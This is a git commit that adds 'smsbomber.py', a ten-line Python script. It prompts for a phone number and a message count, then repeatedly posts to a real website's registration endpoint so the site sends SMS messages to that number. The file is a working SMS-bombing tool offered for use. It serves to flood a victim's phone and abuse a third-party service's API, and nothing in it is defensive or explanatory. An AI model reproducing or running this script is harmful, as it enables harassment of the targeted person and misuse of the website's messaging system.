b1dea3c43310645275d3a8511c37d6708093193b
KhanFaraaz <82717504+KhanFaraaz@users.noreply.github.com>
2022-12-28 12:47:34 +0530

    Create smsbomber.py

---
+++ smsbomber.py
@@ -0,0 +1,10 @@
+#!/usr/bin/python3
+import requests
+num=input("enter number:")
+rg=int(input("enter sms quantity:"))
+values = range(rg)
+for i in values:
+	h='https://gochanakya.com/registration_ajax/'
+	payload={'first_name':'a','phone_varify':'0','last_name':'a','user_id':'','work_phone':num}
+	r=requests.post(h,data=payload,timeout=10)
+	print(r.json())
